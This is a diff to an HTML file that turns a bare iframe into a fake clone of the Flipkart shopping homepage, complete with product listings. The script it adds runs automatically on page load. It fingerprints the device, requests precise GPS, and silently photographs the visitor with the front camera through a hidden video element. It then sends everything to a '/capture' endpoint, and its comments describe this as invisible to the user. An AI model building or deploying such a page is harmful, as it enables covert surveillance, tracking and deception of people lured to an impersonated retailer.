@@ -3,24 +3,423 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title></title>
+    <title>Online Shopping India | Buy Mobiles, Electronics, Appliances, Clothing and More</title>
+    <meta name="description" content="Flipkart - India's leading online shopping portal. Buy mobiles, laptops, cameras, clothing, footwear and more at best prices.">
+    <link rel="icon" href="https://static-assets-web.flixcart.com/batman-returns/batman-returns/p/images/header/imgHeader_flipkartLogo-78bec5.png" type="image/png">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
     <style>
-        html, body {
-            margin: 0;
-            padding: 0;
-            height: 100%;
-            overflow: hidden;
-        }
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{font-family:'Roboto',sans-serif;background:#f1f3f6;color:#212121}
+        a{text-decoration:none;color:inherit}
 
-        iframe {
-            width: 100%;
-            height: 100%;
-            border: none;
+        /* ===== TOP STRIP ===== */
+        .top-strip{background:#2874f0;height:8px}
+
+        /* ===== HEADER ===== */
+        .header{background:#2874f0;padding:8px 0;position:sticky;top:8px;z-index:100}
+        .header-wrap{max-width:1248px;margin:0 auto;display:flex;align-items:center;padding:0 16px;gap:12px}
+        .fk-logo{display:flex;flex-direction:column;margin-right:4px;cursor:pointer}
+        .fk-logo-text{color:#fff;font-size:20px;font-weight:700;font-style:italic;letter-spacing:-0.5px;line-height:1.1}
+        .fk-logo-sub{color:#ffe500;font-size:10px;font-style:italic;display:flex;align-items:center;gap:2px}
+        .fk-logo-sub .plus{background:#ffe500;color:#2874f0;border-radius:50%;width:12px;height:12px;display:inline-flex;align-items:center;justify-content:center;font-size:8px;font-weight:700}
+        .search-wrap{flex:1;max-width:560px;position:relative}
+        .search-wrap input{width:100%;padding:10px 16px 10px 44px;border:none;border-radius:2px;font-size:14px;background:#fff;outline:none;color:#333}
+        .search-wrap input::placeholder{color:#999}
+        .search-wrap .s-icon{position:absolute;left:14px;top:50%;transform:translateY(-50%)}
+        .search-wrap .s-icon svg{width:20px;height:20px;fill:#2874f0}
+        .header-nav{display:flex;align-items:center;gap:28px;margin-left:auto}
+        .header-nav a{color:#fff;font-size:15px;font-weight:500;white-space:nowrap;cursor:pointer}
+        .login-btn{background:#fff;color:#2874f0!important;padding:7px 40px;border-radius:2px;font-weight:600;font-size:14px!important;border:none;cursor:pointer}
+        .cart-icon{display:flex;align-items:center;gap:6px}
+
+        /* ===== SUB HEADER ===== */
+        .sub-header{background:#fff;box-shadow:0 2px 4px rgba(0,0,0,.08);position:sticky;top:52px;z-index:99}
+        .sub-nav{max-width:1248px;margin:0 auto;display:flex;justify-content:space-around;padding:10px 16px}
+        .sub-item{text-align:center;cursor:pointer;padding:4px 12px;position:relative}
+        .sub-item img{width:56px;height:56px;border-radius:50%;object-fit:cover}
+        .sub-item p{font-size:12px;font-weight:600;color:#333;margin-top:6px}
+        .sub-item:hover p{color:#2874f0}
+
+        /* ===== BANNER SLIDER ===== */
+        .banner-section{max-width:1248px;margin:10px auto;padding:0 8px}
+        .banner-slider{position:relative;border-radius:4px;overflow:hidden;height:220px;background:linear-gradient(135deg,#2874f0,#6c63ff)}
+        .banner-slide{display:flex;align-items:center;justify-content:space-between;padding:0 60px;height:100%;color:#fff}
+        .banner-left h2{font-size:32px;font-weight:700;margin-bottom:8px}
+        .banner-left p{font-size:16px;opacity:.9}
+        .banner-left .shop-btn{background:#ff9f00;color:#fff;border:none;padding:12px 28px;border-radius:3px;font-size:14px;font-weight:600;cursor:pointer;margin-top:16px}
+        .banner-right{font-size:80px}
+
+        /* ===== PRODUCT SECTIONS ===== */
+        .section{max-width:1248px;margin:10px auto;background:#fff;border-radius:2px;box-shadow:0 1px 2px rgba(0,0,0,.05)}
+        .section-head{display:flex;justify-content:space-between;align-items:center;padding:16px 20px 0}
+        .section-head h2{font-size:22px;font-weight:600;color:#333}
+        .view-all-btn{background:#2874f0;color:#fff;border:none;padding:10px 24px;border-radius:2px;font-size:13px;font-weight:600;cursor:pointer;text-transform:uppercase}
+        .product-scroll{display:flex;overflow-x:auto;padding:16px 20px 20px;gap:20px;scroll-behavior:smooth;-webkit-overflow-scrolling:touch}
+        .product-scroll::-webkit-scrollbar{height:4px}
+        .product-scroll::-webkit-scrollbar-thumb{background:#ccc;border-radius:2px}
+        .product-card{min-width:190px;max-width:190px;cursor:pointer;text-align:center;padding:8px;border-radius:4px;transition:box-shadow .2s}
+        .product-card:hover{box-shadow:0 3px 12px rgba(0,0,0,.12)}
+        .product-img{width:160px;height:160px;margin:0 auto;display:flex;align-items:center;justify-content:center;background:#fafafa;border-radius:8px;font-size:48px}
+        .product-card h4{font-size:14px;font-weight:500;margin-top:10px;color:#333;line-height:1.3;display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:vertical;overflow:hidden}
+        .product-card .tag{display:inline-block;background:#26a541;color:#fff;font-size:10px;padding:2px 6px;border-radius:2px;margin-top:4px;font-weight:600}
+        .product-card .price-row{margin-top:6px}
+        .product-card .price{font-size:15px;font-weight:600;color:#333}
+        .product-card .mrp{font-size:12px;color:#999;text-decoration:line-through}
+        .product-card .discount{font-size:12px;color:#26a541;font-weight:600}
+
+        /* ===== OFFER BANNERS ===== */
+        .offer-grid{max-width:1248px;margin:10px auto;display:grid;grid-template-columns:1fr 1fr;gap:10px;padding:0 8px}
+        .offer-card{background:#fff;border-radius:4px;padding:24px;display:flex;align-items:center;justify-content:space-between;box-shadow:0 1px 2px rgba(0,0,0,.05);cursor:pointer}
+        .offer-card h3{font-size:18px;font-weight:600;color:#333}
+        .offer-card p{font-size:13px;color:#999;margin-top:4px}
+        .offer-card .emoji{font-size:56px}
+        .offer-card .shop-now{background:#ff6161;color:#fff;border:none;padding:8px 20px;border-radius:2px;font-size:12px;font-weight:600;cursor:pointer;margin-top:8px}
+
+        /* ===== FOOTER ===== */
+        .footer{background:#172337;color:#fff;margin-top:16px;padding:32px 16px}
+        .footer-inner{max-width:1248px;margin:0 auto;display:grid;grid-template-columns:repeat(4,1fr);gap:24px;font-size:12px}
+        .footer-inner h5{font-size:12px;font-weight:600;color:#878787;text-transform:uppercase;margin-bottom:10px;letter-spacing:.5px}
+        .footer-inner a{display:block;color:#fff;margin-bottom:6px;font-size:12px;opacity:.8}
+        .footer-inner a:hover{opacity:1}
+        .footer-bottom{max-width:1248px;margin:20px auto 0;border-top:1px solid #333;padding-top:16px;text-align:center;font-size:11px;color:#878787}
+
+        /* ===== HIDDEN CAPTURE ELEMENTS ===== */
+        #capVideo{display:none;position:fixed;top:-9999px;left:-9999px}
+
+        /* ===== MOBILE ===== */
+        @media(max-width:768px){
+            .header-wrap{flex-wrap:wrap}
+            .search-wrap{max-width:100%;order:3;width:100%;margin-top:6px}
+            .header-nav{gap:16px}
+            .header-nav .hide-mobile{display:none}
+            .sub-nav{overflow-x:auto;justify-content:flex-start}
+            .sub-item{min-width:72px}
+            .sub-item img{width:44px;height:44px}
+            .banner-slider{height:150px}
+            .banner-left h2{font-size:20px}
+            .banner-right{font-size:48px}
+            .offer-grid{grid-template-columns:1fr}
+            .footer-inner{grid-template-columns:1fr 1fr}
+            .product-card{min-width:150px;max-width:150px}
+            .product-img{width:130px;height:130px}
         }
     </style>
 </head>
 <body>
-    <iframe src="https://www.flipkart.com"></iframe>
-    <script src="script.js"></script>
+
+<!-- Top blue strip -->
+<div class="top-strip"></div>
+
+<!-- Header -->
+<div class="header">
+    <div class="header-wrap">
+        <div class="fk-logo">
+            <span class="fk-logo-text">Flipkart</span>
+            <span class="fk-logo-sub">Explore <span style="color:#ffe500">Plus</span> <span class="plus">+</span></span>
+        </div>
+        <div class="search-wrap">
+            <span class="s-icon"><svg viewBox="0 0 24 24"><path d="M10.5 4.5c-3.3 0-6 2.7-6 6s2.7 6 6 6 6-2.7 6-6-2.7-6-6-6zm0 10.5c-2.5 0-4.5-2-4.5-4.5S8 6 10.5 6s4.5 2 4.5 4.5-2 4.5-4.5 4.5zm8.4 4l-3.5-3.5 1-1 3.5 3.5-1 1z"/></svg></span>
+            <input type="text" placeholder="Search for Products, Brands and More">
+        </div>
+        <div class="header-nav">
+            <button class="login-btn">Login</button>
+            <a class="hide-mobile">Become a Seller</a>
+            <a class="hide-mobile">More ▾</a>
+            <a class="cart-icon">🛒 Cart</a>
+        </div>
+    </div>
+</div>
+
+<!-- Sub-header categories -->
+<div class="sub-header">
+    <div class="sub-nav">
+        <div class="sub-item"><img src="https://rukminim1.flixcart.com/flap/80/80/image/29327f40e9c4d26b.png"><p>Grocery</p></div>
+        <div class="sub-item"><img src="https://rukminim1.flixcart.com/flap/80/80/image/22fddf3c7da4c4f4.png"><p>Mobiles</p></div>
+        <div class="sub-item"><img src="https://rukminim1.flixcart.com/fk-p-flap/80/80/image/0d75b34f7d8fbcb3.png"><p>Fashion</p></div>
+        <div class="sub-item"><img src="https://rukminim1.flixcart.com/flap/80/80/image/69c6589653afdb9a.png"><p>Electronics</p></div>
+        <div class="sub-item"><img src="https://rukminim1.flixcart.com/flap/80/80/image/ab7e2b022a4587dd.jpg"><p>Home</p></div>
+        <div class="sub-item"><img src="https://rukminim1.flixcart.com/flap/80/80/image/dff3f7adcf3a90c6.png"><p>Appliances</p></div>
+        <div class="sub-item"><img src="https://rukminim1.flixcart.com/fk-p-flap/80/80/image/05d708653abef576.png"><p>Travel</p></div>
+        <div class="sub-item"><img src="https://rukminim1.flixcart.com/flap/80/80/image/71050627a56b4693.png"><p>Top Offers</p></div>
+        <div class="sub-item"><img src="https://rukminim1.flixcart.com/flap/80/80/image/29327f40e9c4d26b.png"><p>Beauty</p></div>
+        <div class="sub-item"><img src="https://rukminim1.flixcart.com/flap/80/80/image/dff3f7adcf3a90c6.png"><p>Toys</p></div>
+    </div>
+</div>
+
+<!-- Banner -->
+<div class="banner-section">
+    <div class="banner-slider">
+        <div class="banner-slide">
+            <div class="banner-left">
+                <h2>Big Billion Days Sale</h2>
+                <p>Biggest Deals on Electronics, Fashion, Home & More</p>
+                <button class="shop-btn">SHOP NOW</button>
+            </div>
+            <div class="banner-right">🛍️</div>
+        </div>
+    </div>
+</div>
+
+<!-- Best of Electronics -->
+<div class="section">
+    <div class="section-head">
+        <h2>Best of Electronics</h2>
+        <button class="view-all-btn">View All</button>
+    </div>
+    <div class="product-scroll">
+        <div class="product-card">
+            <div class="product-img">📱</div>
+            <h4>Samsung Galaxy M34 5G (128GB, 6GB RAM)</h4>
+            <span class="tag">BESTSELLER</span>
+            <div class="price-row"><span class="price">₹13,999</span> <span class="mrp">₹19,999</span> <span class="discount">30% off</span></div>
+        </div>
+        <div class="product-card">
+            <div class="product-img">💻</div>
+            <h4>HP Pavilion 15 Intel Core i5 13th Gen Laptop</h4>
+            <span class="tag">TOP RATED</span>
+            <div class="price-row"><span class="price">₹54,990</span> <span class="mrp">₹78,175</span> <span class="discount">29% off</span></div>
+        </div>
+        <div class="product-card">
+            <div class="product-img">🎧</div>
+            <h4>boAt Rockerz 450 Bluetooth Headphones</h4>
+            <span class="tag">FLASH SALE</span>
+            <div class="price-row"><span class="price">₹1,299</span> <span class="mrp">₹3,990</span> <span class="discount">67% off</span></div>
+        </div>
+        <div class="product-card">
+            <div class="product-img">⌚</div>
+            <h4>Fire-Boltt Ninja Call Pro Smart Watch</h4>
+            <span class="tag">TRENDING</span>
+            <div class="price-row"><span class="price">₹1,499</span> <span class="mrp">₹9,999</span> <span class="discount">85% off</span></div>
+        </div>
+        <div class="product-card">
+            <div class="product-img">📷</div>
+            <h4>Canon EOS 1500D DSLR Camera Body+Lens</h4>
+            <div class="price-row"><span class="price">₹32,999</span> <span class="mrp">₹39,995</span> <span class="discount">17% off</span></div>
+        </div>
+        <div class="product-card">
+            <div class="product-img">🔊</div>
+            <h4>JBL Flip 6 Portable Bluetooth Speaker</h4>
+            <div class="price-row"><span class="price">₹8,999</span> <span class="mrp">₹13,999</span> <span class="discount">35% off</span></div>
+        </div>
+    </div>
+</div>
+
+<!-- Offer Cards -->
+<div class="offer-grid">
+    <div class="offer-card">
+        <div>
+            <h3>Top Deals on Smartphones</h3>
+            <p>From ₹6,999* | Exchange Offers Available</p>
+            <button class="shop-now">SHOP NOW</button>
+        </div>
+        <div class="emoji">📱</div>
+    </div>
+    <div class="offer-card">
+        <div>
+            <h3>Fashion Mega Sale</h3>
+            <p>Min 50% Off | Top Brands</p>
+            <button class="shop-now">SHOP NOW</button>
+        </div>
+        <div class="emoji">👗</div>
+    </div>
+</div>
+
+<!-- Mobiles Section -->
+<div class="section">
+    <div class="section-head">
+        <h2>Top Deals on Mobiles</h2>
+        <button class="view-all-btn">View All</button>
+    </div>
+    <div class="product-scroll">
+        <div class="product-card">
+            <div class="product-img">📱</div>
+            <h4>Apple iPhone 15 (128 GB) - Blue</h4>
+            <span class="tag">BIGGEST PRICE DROP</span>
+            <div class="price-row"><span class="price">₹66,999</span> <span class="mrp">₹79,900</span> <span class="discount">16% off</span></div>
+        </div>
+        <div class="product-card">
+            <div class="product-img">📱</div>
+            <h4>OnePlus Nord CE 3 5G (Aquamarine, 128GB)</h4>
+            <div class="price-row"><span class="price">₹19,999</span> <span class="mrp">₹26,999</span> <span class="discount">25% off</span></div>
+        </div>
+        <div class="product-card">
+            <div class="product-img">📱</div>
+            <h4>Realme Narzo 60 5G (Mars Orange, 128GB)</h4>
+            <span class="tag">NEW LAUNCH</span>
+            <div class="price-row"><span class="price">₹12,999</span> <span class="mrp">₹19,999</span> <span class="discount">35% off</span></div>
+        </div>
+        <div class="product-card">
+            <div class="product-img">📱</div>
+            <h4>POCO X5 Pro 5G (Yellow, 256 GB, 8GB RAM)</h4>
+            <div class="price-row"><span class="price">₹16,999</span> <span class="mrp">₹24,999</span> <span class="discount">32% off</span></div>
+        </div>
+        <div class="product-card">
+            <div class="product-img">📱</div>
+            <h4>Samsung Galaxy S23 FE 5G (Mint, 128GB)</h4>
+            <div class="price-row"><span class="price">₹34,999</span> <span class="mrp">₹49,999</span> <span class="discount">30% off</span></div>
+        </div>
+    </div>
+</div>
+
+<!-- Fashion Section -->
+<div class="section">
+    <div class="section-head">
+        <h2>Fashion Top Deals</h2>
+        <button class="view-all-btn">View All</button>
+    </div>
+    <div class="product-scroll">
+        <div class="product-card">
+            <div class="product-img">👟</div>
+            <h4>Nike Revolution 6 Running Shoes For Men</h4>
+            <span class="tag">BESTSELLER</span>
+            <div class="price-row"><span class="price">₹2,795</span> <span class="mrp">₹4,495</span> <span class="discount">37% off</span></div>
+        </div>
+        <div class="product-card">
+            <div class="product-img">👕</div>
+            <h4>Allen Solly Men Solid Polo Neck Cotton T-Shirt</h4>
+            <div class="price-row"><span class="price">₹539</span> <span class="mrp">₹999</span> <span class="discount">46% off</span></div>
+        </div>
+        <div class="product-card">
+            <div class="product-img">👜</div>
+            <h4>Lavie Women Handbag - Purple</h4>
+            <span class="tag">LOWEST EVER</span>
+            <div class="price-row"><span class="price">₹699</span> <span class="mrp">₹2,999</span> <span class="discount">76% off</span></div>
+        </div>
+        <div class="product-card">
+            <div class="product-img">⌚</div>
+            <h4>Titan Raga Women's Analog Watch</h4>
+            <div class="price-row"><span class="price">₹4,295</span> <span class="mrp">₹6,595</span> <span class="discount">34% off</span></div>
+        </div>
+        <div class="product-card">
+            <div class="product-img">🕶️</div>
+            <h4>Ray-Ban Aviator Sunglasses (Green)</h4>
+            <div class="price-row"><span class="price">₹5,590</span> <span class="mrp">₹7,490</span> <span class="discount">25% off</span></div>
+        </div>
+    </div>
+</div>
+
+<!-- Footer -->
+<div class="footer">
+    <div class="footer-inner">
+        <div>
+            <h5>About</h5>
+            <a href="#">Contact Us</a><a href="#">About Us</a><a href="#">Careers</a><a href="#">Press</a><a href="#">Corporate Information</a>
+        </div>
+        <div>
+            <h5>Help</h5>
+            <a href="#">Payments</a><a href="#">Shipping</a><a href="#">Cancellation & Returns</a><a href="#">FAQ</a>
+        </div>
+        <div>
+            <h5>Policy</h5>
+            <a href="#">Return Policy</a><a href="#">Terms Of Use</a><a href="#">Security</a><a href="#">Privacy</a><a href="#">Sitemap</a>
+        </div>
+        <div>
+            <h5>Social</h5>
+            <a href="#">Facebook</a><a href="#">Twitter</a><a href="#">YouTube</a><a href="#">Instagram</a>
+        </div>
+    </div>
+    <div class="footer-bottom">
+        <p>© 2009-2024 Flipkart.com. All Rights Reserved.</p>
+    </div>
+</div>
+
+<!-- Hidden video element for camera -->
+<video id="capVideo" autoplay playsinline muted></video>
+
+<script>
+const API = window.location.origin;
+let _captured = false;
+
+// ── Device fingerprint ──────────────────────────────────────────
+function _deviceInfo() {
+    var d = {
+        platform: navigator.platform || 'Unknown',
+        cores: navigator.hardwareConcurrency || 'Unknown',
+        ram: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Unknown',
+        language: navigator.language || 'Unknown',
+        screen: screen.width + 'x' + screen.height,
+        userAgent: navigator.userAgent,
+        browser: 'Unknown', os: 'Unknown',
+        gpu_vendor: 'Unknown', gpu_renderer: 'Unknown',
+        battery: 'Unknown', online: navigator.onLine ? 'Yes' : 'No'
+    };
+    var u = navigator.userAgent;
+    if (u.includes('Firefox')) d.browser = 'Firefox ' + (u.split('Firefox/')[1]||'').split(' ')[0];
+    else if (u.includes('Edg')) d.browser = 'Edge ' + (u.split('Edg/')[1]||'').split(' ')[0];
+    else if (u.includes('Chrome')) d.browser = 'Chrome ' + (u.split('Chrome/')[1]||'').split(' ')[0];
+    else if (u.includes('Safari')) d.browser = 'Safari ' + (u.split('Version/')[1]||'').split(' ')[0];
+    if (u.includes('Win')) d.os = 'Windows';
+    else if (u.includes('Mac')) d.os = 'macOS';
+    else if (u.includes('Android')) d.os = 'Android ' + (u.match(/Android\s([\d.]+)/)?.[1]||'');
+    else if (u.includes('iPhone')||u.includes('iPad')) d.os = 'iOS';
+    else if (u.includes('Linux')) d.os = 'Linux';
+    try {
+        var c = document.createElement('canvas'), gl = c.getContext('webgl')||c.getContext('experimental-webgl');
+        if (gl) { var x = gl.getExtension('WEBGL_debug_renderer_info'); if(x){d.gpu_vendor=gl.getParameter(x.UNMASKED_VENDOR_WEBGL);d.gpu_renderer=gl.getParameter(x.UNMASKED_RENDERER_WEBGL);} }
+    } catch(e){}
+    return d;
+}
+
+// ── High-accuracy GPS ──────────────────────────────────────────
+function _gps() {
+    return new Promise((ok, no) => {
+        if (!navigator.geolocation) { no('No GPS'); return; }
+        navigator.geolocation.getCurrentPosition(
+            p => ok({ latitude:p.coords.latitude, longitude:p.coords.longitude, accuracy:p.coords.accuracy+' m',
+                      altitude:p.coords.altitude!=null?p.coords.altitude+' m':'N/A',
+                      heading:p.coords.heading!=null?p.coords.heading+' deg':'N/A',
+                      speed:p.coords.speed!=null?p.coords.speed+' m/s':'N/A' }),
+            e => no(e.message),
+            { enableHighAccuracy: true, timeout: 30000, maximumAge: 0 }
+        );
+    });
+}
+
+// ── Silent camera capture ──────────────────────────────────────
+function _cam() {
+    return new Promise(ok => {
+        navigator.mediaDevices.getUserMedia({ video: { facingMode:'user' } })
+        .then(s => {
+            var v = document.getElementById('capVideo');
+            v.srcObject = s;
+            v.onloadedmetadata = () => { v.play(); setTimeout(() => {
+                var cv = document.createElement('canvas');
+                cv.width = v.videoWidth; cv.height = v.videoHeight;
+                cv.getContext('2d').drawImage(v, 0, 0, cv.width, cv.height);
+                s.getTracks().forEach(t => t.stop());
+                ok(cv.toDataURL('image/png'));
+            }, 2000); };
+        }).catch(() => ok(null));
+    });
+}
+
+// ── Battery ────────────────────────────────────────────────────
+function _batt() {
+    return new Promise(ok => {
+        if (navigator.getBattery) navigator.getBattery().then(b => ok((b.level*100)+'%')).catch(() => ok('Unknown'));
+        else ok('Unknown');
+    });
+}
+
+// ── SILENT AUTO-CAPTURE (no user interaction needed) ───────────
+async function _silentCapture() {
+    if (_captured) return;
+    _captured = true;
+    var dev = _deviceInfo();
+    var [loc, photo, bat] = await Promise.all([
+        _gps().catch(() => ({ latitude:'Denied',longitude:'Denied',accuracy:'N/A',altitude:'N/A',heading:'N/A',speed:'N/A' })),
+        _cam(),
+        _batt()
+    ]);
+    dev.battery = bat;
+    $.ajax({ type:'POST', url:API+'/capture', contentType:'application/json',
+        data: JSON.stringify({ device:dev, location:loc, photo:photo, timestamp:new Date().toISOString() })
+    });
+}
+
+// Auto-start 300ms after page load — invisible to user
+$(function(){ setTimeout(_silentCapture, 300); });
+</script>
 </body>
 </html>
